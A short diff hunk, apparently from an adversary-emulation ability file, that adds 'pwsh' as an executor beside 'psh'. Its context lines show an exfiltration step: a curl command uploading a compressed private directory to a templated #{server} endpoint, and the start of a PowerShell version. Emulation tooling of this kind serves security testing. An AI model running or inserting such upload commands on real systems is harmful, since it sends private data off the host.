@@ -17,7 +17,7 @@
         command: |
           curl -F "data=@#{host.dir.compress.private}" #{server}/file/upload
     windows:
-      psh:
+      psh,pwsh:
         command: |
           $fileBin = [System.IO.File]::ReadAllBytes("#{host.dir.compress.private}");
           $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
